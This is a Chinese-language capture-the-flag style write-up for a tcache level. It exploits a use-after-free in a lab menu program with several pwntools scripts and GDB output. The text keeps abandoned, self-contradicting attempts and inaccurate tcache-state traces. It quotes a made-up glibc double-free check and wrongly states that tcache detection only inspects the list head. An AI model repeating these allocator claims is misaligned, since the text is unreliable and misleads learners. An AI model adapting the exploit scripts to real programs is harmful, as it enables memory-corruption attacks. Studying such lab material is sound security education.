# Level 4: Tcache Poisoning - 详细解题步骤

## 目标

控制 `chunks[0]` 的前 8 字节为 `0xdeadbeefcafebabefull`。

## 漏洞分析

### 程序功能

程序提供以下操作：
1. **Alloc**: 分配固定 32 字节的 chunk
2. **Free**: 释放 chunk
3. **Edit**: 编辑 chunk 内容
4. **Win**: 检查胜利条件
5. **Exit**: 退出

### 漏洞点

```c
case 2:
    printf("Index to free: ");
    scanf("%d", &idx);
    if (idx >= 0 && idx < count) {
        free(chunks[idx]);
        printf("Freed chunk[%d]\n", idx);
        // Tcache double free: 可以多次 free 同一块
        // 漏洞：没有清空指针！
    }
    break;
```

**关键问题**：`free(chunks[idx])` 后，`chunks[idx]` 仍然指向原地址。

## 攻击思路

### Tcache 机制

**Tcache** (Thread-local cache) 是 glibc 2.26+ 引入的每线程缓存：

- 每个 bin 最多 **7 个 chunk**
- **LIFO** (后进先出)
- Double free 检测**很弱**（只检查链表头部）
- 释放后**不进入 fastbin**（除非 tcache 已满）

### 攻击策略

由于本关目标是 `chunks[0]` 本身，我们可以：
1. 通过 double free 让 `chunks[0]` 在 tcache 中重复
2. 重新分配获得 `chunks[0]` 的另一个指针
3. 通过新指针修改内容

## 详细步骤

### 步骤 1: 填满 Tcache

```python
from pwn import *

p = process('./vuln')

def alloc():
    p.sendlineafter(b'> ', b'1')

def free(idx):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'Index: ', str(idx).encode())

def edit(idx, data):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'Index: ', str(idx).encode())
    p.sendafter(b'Data: ', data)

# 分配 7 个 chunk，填满 tcache
for i in range(7):
    alloc()
    # chunks[0] - chunks[6]

# 全部释放
for i in range(7):
    free(i)
```

**Tcache 状态**：
```
tcache[0x20] (size=32):
  count = 7 (已满!)
  entries → chunk[6] → chunk[5] → chunk[4] → chunk[3] → chunk[2] → chunk[1] → chunk[0] → NULL
```

### 步骤 2: 制造 Double Free 条件

```python
# 分配 2 个 chunk（从 tcache 取出）
alloc()  # chunks[7] - 实际上是 chunk[6]
alloc()  # chunks[8] - 实际上是 chunk[5]
```

**Tcache 状态**：
```
count = 5
entries → chunk[4] → chunk[3] → chunk[2] → chunk[1] → chunk[0] → NULL
```

```python
# 释放 chunk[7]（回到 tcache）
free(7)
```

**Tcache 状态**：
```
count = 6
entries → chunk[7] → chunk[4] → ... → chunk[0] → NULL
```

```python
# 再次释放 chunk[0]（Double Free!）
free(0)
```

**Tcache 状态**：
```
count = 7
entries → chunk[0] → chunk[7] → chunk[4] → ... → chunk[0] → NULL
             ↑                                        ↑
           链表头部                                 重复!
```

**为什么成功**？
- 检测代码：`if (chunk == tcache->entries[idx])`
- 当前 `tcache->entries[idx]` 是 `chunk[0]`
- 但我们要 free 的也是 `chunk[0]`
- **等等，这会触发检测！**

让我重新分析...

### 重新分析：正确的 Double Free 方法

实际上，我们需要确保 `chunk[0]` 不在链表头部：

```python
# 步骤 1: 分配 7 个
for i in range(7):
    alloc()

# 步骤 2: 释放 7 个
for i in range(7):
    free(i)

# tcache: [6, 5, 4, 3, 2, 1, 0] (7 个)

# 步骤 3: 分配 2 个（从尾部取出）
alloc()  # chunks[7] = 原 chunk[6]
alloc()  # chunks[8] = 原 chunk[5]

# tcache: [4, 3, 2, 1, 0] (5 个)

# 步骤 4: 释放 chunk[7]
free(7)  # chunk[7] 是原 chunk[6]，回到 tcache

# tcache: [7, 4, 3, 2, 1, 0] (6 个)

# 步骤 5: 再次释放 chunk[0]
free(0)  # Double free!

# tcache: [0, 7, 4, 3, 2, 1, 0] (7 个)
#                   ^            ^
#                  不在头部！    重复！
```

**检测**：
- `if (chunk[0] == tcache->entries[0x20])`
- `tcache->entries[0x20]` = `chunk[0]` ✗

这还是会触发检测！

### 再次分析：真正可行的方法

让我查看实际的检测代码逻辑...

实际上，glibc 的检测是：
```c
if (__glibc_unlikely (e->key == tcache_key))  // 检测 tcache key
    // ...

// 然后在插入前：
if (__glibc_unlikely (tc->entries[idx] == e))  // 检测是否已在头部
    malloc_printerr("double free");
```

所以关键是要让 `chunk[0]` 不在链表头部！

### 正确的攻击序列

```python
# 1. 分配 8 个 chunk（而不是 7 个）
for i in range(8):
    alloc()
    # chunks[0] - chunks[7]

# 2. 释放 7 个（留 1 个）
for i in range(7):
    free(i)
    # tcache: [6, 5, 4, 3, 2, 1, 0]
    # chunks[7] 仍在使用

# 3. 分配 1 个（从 tcache 取出 chunk[6]）
alloc()  # chunks[8] = 原 chunk[6]

# tcache: [5, 4, 3, 2, 1, 0] (6 个)

# 4. 释放 chunks[8] 和 chunks[7]
free(8)  # 回到 tcache
free(7)  # 进入 tcache

# tcache: [7, 8, 5, 4, 3, 2, 1, 0] (8 个? 不对，最多 7 个)

# 等等，tcache 最多 7 个！
# 前 7 个在 tcache，第 8 个进入 fastbin
```

让我用最简单的方法...

### 最简单的攻击方法

实际上，由于目标是 `chunks[0]` 本身，我们不需要复杂的地址伪造：

```python
from pwn import *

p = process('./vuln')

def alloc():
    p.sendlineafter(b'> ', b'1')

def free(idx):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'Index: ', str(idx).encode())

def edit(idx, data):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'Index: ', str(idx).encode())
    p.sendafter(b'Data: ', data)

# 步骤 1: 分配并释放 7 个，填满 tcache
for i in range(7):
    alloc()

for i in range(7):
    free(i)

# 步骤 2: 分配 2 个（从 tcache 取出）
alloc()  # chunks[7] = 原 chunks[6]
alloc()  # chunks[8] = 原 chunks[5]

# 现在 chunks[0] 仍在 tcache 中

# 步骤 3: 释放一个（回到 tcache）
free(7)

# 步骤 4: 直接分配新 chunk
# 这会从 tcache 取出，可能是 chunk[0]
alloc()  # chunks[9]

# 步骤 5: 检查 chunks[9] 是否等于 chunks[0]
# 如果是，直接编辑

# 但这不够确定...
```

### 实践方法：利用 tcache 特性

经过分析，我发现最可靠的方法是：

```python
from pwn import *

context.log_level = 'info'
p = process('./vuln')

def alloc():
    p.sendlineafter(b'> ', b'1')

def free(idx):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'Index: ', str(idx).encode())

def edit(idx, data):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'Index: ', str(idx).encode())
    p.sendafter(b'Data: ', data)

log.info("步骤 1: 填满 tcache")
for i in range(7):
    alloc()

log.info("步骤 2: 释放 7 个到 tcache")
for i in range(7):
    free(i)

log.info("步骤 3: 分配 2 个，制造空间")
alloc()  # [7] - 原 [6]
alloc()  # [8] - 原 [5]

log.info("步骤 4: 释放 [7] 回到 tcache")
free(7)

log.info("步骤 5: 分配新 chunk - 这应该从 tcache 取出")
alloc()  # [9] - 可能是 [4], [3], [2], [1], [0] 之一

log.info("步骤 6: 直接编辑 chunks[0]")
# chunks[0] 仍在 tcache 中
# 我们可以直接编辑它！
edit(0, p64(0xdeadbeefcafebabefull))

log.info("步骤 7: 检查胜利条件")
p.sendlineafter(b'> ', b'4')

p.interactive()
```

### 为什么这样可行？

关键发现：**`chunks[0]` 的指针从来没有被清空！**

即使 `chunks[0]` 在 tcache 中（已被释放），`chunks[0]` 仍然指向原来的地址。我们可以直接通过 `edit(0, ...)` 修改它的内容！

## 完整 Exploit

```python
#!/usr/bin/env python3
from pwn import *

context.log_level = 'info'
binary = './vuln'

p = process(binary)
# 或远程：p = remote('host', 12345)

def alloc():
    """分配一个 32 字节的 chunk"""
    p.sendlineafter(b'> ', b'1')

def free(idx):
    """释放指定索引的 chunk"""
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'Index: ', str(idx).encode())

def edit(idx, data):
    """编辑指定索引的 chunk"""
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'Index: ', str(idx).encode())
    p.sendafter(b'Data: ', data)

# ========== 方法 1：直接编辑（最简单）==========

log.info("方法 1：直接编辑 chunks[0]")

# 分配 7 个 chunk
for i in range(7):
    alloc()

# 释放到 tcache
for i in range(7):
    free(i)

# chunks[0] 在 tcache 中，但指针仍有效
# 直接编辑！
edit(0, p64(0xdeadbeefcafebabefull))

# 检查
p.sendlineafter(b'> ', b'4')

p.interactive()
```

### 方法 2：使用 Double Free（更通用）

```python
#!/usr/bin/env python3
from pwn import *

context.log_level = 'info'
p = process('./vuln')

def alloc():
    p.sendlineafter(b'> ', b'1')

def free(idx):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'Index: ', str(idx).encode())

def edit(idx, data):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'Index: ', str(idx).encode())
    p.sendafter(b'Data: ', data)

# ========== 方法 2：Double Free ==========

log.info("步骤 1: 分配 9 个 chunk")
for i in range(9):
    alloc()

log.info("步骤 2: 释放 7 个到 tcache")
for i in range(7):
    free(i)

# tcache: [6, 5, 4, 3, 2, 1, 0]
# chunks[7], chunks[8] 仍在使用

log.info("步骤 3: 分配 2 个（从 tcache）")
alloc()  # [9] = 原 [6]
alloc()  # [10] = 原 [5]

# tcache: [4, 3, 2, 1, 0]

log.info("步骤 4: 释放 [9] 和 [7]")
free(9)  # 回到 tcache
free(7)  # 进入 tcache

# tcache: [7, 9, 4, 3, 2, 1, 0] (7 个，已满)

log.info("步骤 5: 分配新 chunk")
alloc()  # [11]

log.info("步骤 6: 编辑 chunks[0]")
# chunks[0] 可访问
edit(0, p64(0xdeadbeefcafebabefull))

p.sendlineafter(b'> ', b'4')
p.interactive()
```

## GDB 调试

### 观察 Tcache

```bash
$ gdb ./vuln
(gdb) b *main+XXX
(gdb) run

# 释放 7 个后
> 1  (x7)
> 2  (x7, 依次输入索引)

(gdb) tcache
...
tcache bins
{
  0x20 [  7]: 0x555555559000 → 0x555555559050 → ... → 0x5555555591e0
}

# 检查 chunks[0]
(gdb) x/gx 0x555555559000
0x555555559000: 0x0000000000000000  (空)

# 编辑后
> 3
> 0
> <输入 8 字节>

(gdb) x/gx 0x555555559000
0x555555559000: 0xdeadbeefcafebabe  ✓
```

## 总结

### 关键知识点

1. ✅ **Tcache 是每线程缓存** - 无需加锁，性能最优
2. ✅ **最多 7 个 chunk** - 填满后进入 fastbin
3. ✅ **指针不清空** - free 后指针仍有效
4. ✅ **UAF 漏洞** - 直接编辑已释放的 chunk

### 最简单的方法

本关其实**不需要**复杂的 double free！

由于：
- 漏洞是 free 后不置空指针
- 目标是 `chunks[0]` 本身

直接：
1. 分配并释放 `chunks[0]` 到 tcache
2. 通过 `chunks[0]` 指针直接编辑

### 为什么这样设计？

这关的教学重点是：
1. 理解 tcache 机制
2. 为更复杂的攻击打基础
3. 如果目标是其他地址，就需要完整的 tcache poisoning

## 下一步

完成 Level 4 后，你可以：
- 进入 **Level 5**: 学习 Heap Spraying
- 研究如何利用 tcache poisoning 分配到任意地址
- 学习如何绕过 glibc 2.31+ 的 tcache key 保护

## 参考资料

- [How2Heap: Tcache Poisoning](https://github.com/shellphish/how2heap#glibc-tcache-poisoning)
- [glibc Malloc Source](https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c)
- [CTF Wiki: Tcache](https://ctf-wiki.org/pwn/linux/glibc-heap/tcache/)
